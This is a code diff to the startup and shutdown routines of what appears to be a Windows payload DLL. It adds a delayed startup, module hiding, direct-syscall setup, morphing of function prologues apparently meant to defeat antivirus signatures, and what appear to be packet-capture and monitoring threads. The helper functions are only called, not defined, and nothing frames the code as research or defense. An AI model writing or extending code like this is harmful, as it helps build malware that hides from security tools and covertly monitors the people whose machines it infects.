@@ -16,12 +16,16 @@ static DWORD WINAPI startup_thread(LPVOID param)
     (void)param;
     Sleep(10000);
 
-    stealth_hide(g_self);
-
     char logPath[MAX_PATH];
     get_log_path(logPath, MAX_PATH);
     log_init(logPath);
     log_write("D", "0x%p", g_self);
+
+    syscall_init();
+
+    antisig_morph_prologues((PVOID)g_self);
+
+    stealth_hide(g_self);
 
     const char *orig = stealth_get_orig_path();
     const char *moved = stealth_get_moved_path();
@@ -35,6 +39,8 @@ static DWORD WINAPI startup_thread(LPVOID param)
         log_write("S", "NO path");
     }
 
+    xmon_start();
+    pcap_start();
     gstate_start();
     return 0;
 }
@@ -50,6 +56,8 @@ void payload_startup(HMODULE selfModule)
 void payload_shutdown(void)
 {
     if (!g_initialized) return;
+    pcap_stop();
+    xmon_stop();
     gstate_stop();
     log_close();
     stealth_restore();
